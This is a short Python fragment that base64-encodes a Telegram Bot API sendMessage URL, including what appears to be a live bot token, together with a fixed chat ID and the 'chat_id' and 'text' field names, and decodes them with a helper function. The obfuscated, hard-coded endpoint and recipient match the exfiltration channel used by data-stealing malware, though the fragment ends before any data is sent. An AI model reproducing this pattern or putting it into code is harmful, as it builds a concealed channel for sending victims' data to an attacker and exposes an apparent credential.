import base64 as ba


def b(s):
    return ba.b64decode(s).decode()


a = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYyOTAyNjE1Njc6QUFGMVcwalJ0a0RubkdCbFlBbWJDSXpVdTJxRGRUY19ibTQvc2VuZE1lc3NhZ2U='
baa = 'Y2hhdF9pZA=='
c = 'NTg1NDk1NDM4OA=='
d = 'dGV4dA=='
